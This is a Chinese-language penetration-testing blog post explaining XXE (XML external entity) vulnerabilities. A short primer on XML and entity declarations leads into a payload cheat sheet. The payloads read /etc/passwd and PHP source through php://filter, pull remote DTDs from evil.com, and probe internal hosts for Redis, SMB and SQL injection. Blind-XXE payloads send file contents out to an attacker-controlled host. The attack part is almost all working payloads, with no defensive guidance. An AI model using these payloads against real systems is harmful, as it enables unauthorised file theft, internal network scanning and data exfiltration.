+++
date = "2017-12-09T23:02:22+08:00"
description = "XXE漏洞是针对使用XML交互的Web应用程序的攻击方法"
draft = false
tags = ["xml"]
title = "XXE漏洞"
topics = ["Pentest"]

+++

### 0x00 XXE
XXE漏洞是针对使用XML交互的Web应用程序的攻击方法

XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛

### 0x01 XML格式
```xml
<?xml version="1.0" encoding="utf-8"?>  <!--xml声明-->

<!--文档类型定义-->
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to       (#PCDATA)>
  <!ELEMENT from     (#PCDATA)>
  <!ELEMENT heading  (#PCDATA)>
  <!ELEMENT body     (#PCDATA)>
]>

<!--文档元素-->
<note>
<to>Tom</to>
<from>John</from>
<heading>Reminder</heading>
<body>Hi,I’am John</body>
</note>
```

### 0x02 内部声明与外部引用
```xml
<!--内部声明实体-->
<!ENTITY 实体名称 "实体的值">

<!--引用外部实体-->
<!ENTITY 实体名称 SYSTEM "URI">
```

### 0x03 XXE漏洞
* 外部引用时可能会出现漏洞，几种payload：

```xml
<?xml version="1.0"?>
<!DOCTYPE a [
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<test>&xxe;</test>
```
<br>
```xml
<?xml version="1.0"?>
<!DOCTYPE a [
  <!ENTITY % d SYSTEM "http://evil.com/evil.dtd" >
  %d;
]>
<test>&b;</test>

evil.dtd中的内容为：<!ENTITY b SYSTEM "file:///etc/passwd" >
```
<br>
```xml
<?xml version="1.0"?>
<!DOCTYPE a SYSTEM "http://evil.com/evil.dtd">
<test>&b;</test>

evil.dtd中的内容为：<!ENTITY b SYSTEM "file:///etc/passwd" >
```

* 简单绕过

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xdsec [
  <!ELEMENT methodname ANY >
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >
]>
<methodcall>
  <methodname>&xxe;</methodname>
</methodcall>
```

* 扫描内网

```xml
<!ENTITY portscan SYSTEM 'http://192.168.2.22:6379/'>
<!ENTITY smb SYSTEM '\\192.168.2.22\C$'>
<!ENTITY sqli SYSTEM 'http://192.168.2.22/a.php?id=-1+union+select+1,2,3--'>
```

* Blind-XXE

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
    <!ENTITY % ttt SYSTEM "php://filter/convert.base64-encode/resource=/flag">
    <!ENTITY % remote SYSTEM "http://Your IP/evil.xml">
    %remote;   <!--引用remote来将外部文件evil.xml引入到解释上下文中-->
    %payload;   <!--执行%payload，这时会检测到send实体，然后在root节点中引用send，就可以成功实现数据转发-->
]>
<root>&send;</root>

<!--evil.xml内容：-->
<!ENTITY % payload "<!ENTITY % send SYSTEM 'http://Your IP/a.php?content=%ttt;'>">
```
<br>
```xml
<?xml version="1.0"?>  
<!DOCTYPE ANY[  
    <!ENTITY % file SYSTEM "file:///C:/1.txt">  
    <!ENTITY % remote SYSTEM "http://192.168.150.1/evil.xml">  
    %remote;  
    %all;  
    %send;  
]>

<!--evil.xml内容：-->
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://192.168.150.1/1.php?file=%file;'>">
```

<br>
#### Reference(侵删)：
* [http://blog.csdn.net/u011721501/article/details/43775691](http://blog.csdn.net/u011721501/article/details/43775691)
